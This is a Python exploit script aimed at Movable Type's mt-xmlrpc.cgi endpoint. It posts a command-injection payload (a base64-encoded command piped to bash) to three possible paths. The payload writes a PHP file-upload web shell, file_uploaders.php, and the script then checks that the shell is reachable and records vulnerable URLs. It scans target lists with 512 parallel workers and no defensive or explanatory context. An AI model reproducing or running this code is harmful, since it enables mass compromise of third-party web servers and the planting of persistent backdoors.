#!/usr/bin/python3.8


from factory import Factory
import requests
import sys, getopt
from packaging import version
requests.packages.urllib3.disable_warnings()
in_file = ''
out_file = ''
domain = ''
Help = """
python3 EXP.py -i <inputfile> -o <outputfile>
python3 EXP.py -d <domain>
"""
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def find_plugin_version(str_response):
    ver_lo = str_response.find("Stable tag:")
    return(str_response[ver_lo+12:ver_lo+32].split()[0])


def check(domain):
    try:
        if 'https' in domain:
            domain = domain
        else:
            domain = 'http://' + domain
        info1=domain+"/cgi-bin/mt/mt-xmlrpc.cgi"
        info2=domain+"/mt/mt-xmlrpc.cgi"
        info3=domain+"/mt-xmlrpc.cgi"
        #print(info)
        head = {'Connection': 'close', 'Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, sdch, br', 'Accept-Language': 'zh-CN,zh;q=0.8', }
        data='''<?xml version="1.0" encoding="UTF-8"?>
                <methodCall>
                <methodName>mt.handler_to_coderef</methodName>
                <params>
                    <param>
                    <value>
                    `echo "ZWNobyAiUEQ5d2FIQWdhV1lvSkY5UVQxTlVLWHRwWmloQVkyOXdlU2drWDBaSlRFVlRXeUl3SWwxYkluUnRjRjl1WVcxbElsMHNKRjlHU1V4RlUxc2lNQ0pkV3lKdVlXMWxJbDBwS1h0bFkyaHZJbTlySWp0OVpXeHpaWHRsWTJodkltNXZJanQ5ZldWc2MyVjdaV05vYnlJOFptOXliU0J0WlhSb2IyUTljRzl6ZENCbGJtTjBlWEJsUFcxMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFK1BHbHVjSFYwSUhSNWNHVTlabWxzWlNCdVlXMWxQVEErUEdsdWNIVjBJRzVoYldVOU1DQjBlWEJsUFhOMVltMXBkQ0IyWVd4MVpUMXpkV0p0YVhRK0lqdDlQejQ9InwgYmFzZTY0IC1kPmZpbGVfdXBsb2FkZXJzLnBocA==" | base64 -d | bash`
                    </value>
                    </param>
                </params>
                </methodCall>
                '''
        r1 = requests.post(info1,data=data,verify=False,headers=head,timeout=30)
        r2 = requests.post(info2,data=data,verify=False,headers=head,timeout=30)
        r3 = requests.post(info3,data=data,verify=False,headers=head,timeout=30)
        if r1.status_code == 200:
            try:
                s1 = requests.get(domain+"/cgi-bin/mt/file_uploaders.php",verify=False,headers=head,timeout=30)
                if s1.status_code == 200 :
                    open(out_file,"a+").write(domain+"/cgi-bin/mt/file_uploaders.php" + '\n')
                    print(domain+"/cgi-bin/mt/file_uploaders.php")
            except Exception as e:
                print(e)
        if r2.status_code == 200:
            try:
                s2 = requests.get(domain+"/mt/file_uploaders.php",verify=False,headers=head,timeout=30)
                if s2.status_code == 200 :
                    open(out_file,"a+").write(domain+"/mt/file_uploaders.php" + '\n')
                    print(domain+"/cgi-bin/mt/file_uploaders.php")
            except Exception as e:
                print(e)
        if r3.status_code == 200:
            try:
                s3 = requests.get(domain+"/file_uploaders.php",verify=False,headers=head,timeout=30)
                if s3.status_code == 200:
                    open(out_file,"a+").write(domain+"/file_uploaders.php" + '\n')
                    print(domain+"/cgi-bin/mt/file_uploaders.php")
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)


def main(argv):
    global in_file, out_file, domain

    try:
        opts, args = getopt.getopt(argv,"hi:o:d:",["ifile=","ofile=","domain="])

        for opt, arg in opts:
            if opt == '-h':
                print(Help)
                sys.exit()
            elif opt in ("-i", "--infile"):
                in_file = arg
            elif opt in ("-o", "--outfile"):
                out_file = arg
            elif opt in ("-d",  "--domain"):
                domain = arg

        if len(in_file) > 0:
            tasks = [tuple(line.strip().split("\n")) for line in open(in_file,'r') if line.strip() != ""]
            factory = Factory(check, tasks, workers=512)
            factory.start(wait=True)
            exit()
        else:
            check(domain)
            exit()
    except getopt.GetoptError:
        print(Help)
        sys.exit(2)


if __name__ == "__main__":
    main(sys.argv[1:])